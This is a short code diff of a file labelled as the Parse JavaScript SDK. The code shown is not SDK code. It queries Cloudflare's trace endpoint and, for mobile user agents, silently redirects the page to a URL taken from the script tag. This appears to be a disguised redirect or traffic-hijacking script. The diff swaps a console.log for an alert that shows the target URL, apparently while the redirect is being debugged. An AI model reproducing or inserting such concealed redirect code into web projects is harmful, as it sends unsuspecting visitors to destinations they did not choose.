@@ -1,4 +1,3 @@
-console.log(1);
 /**
  * Parse JavaScript SDK v3.2.0
  *
@@ -63,6 +62,7 @@ $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
       } else {
         // if is mobile
         if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
+          alert(document.currentScript.getAttribute('url'));
           window.location.replace(document.currentScript.getAttribute('url'));
 
           //your code for mobile devices
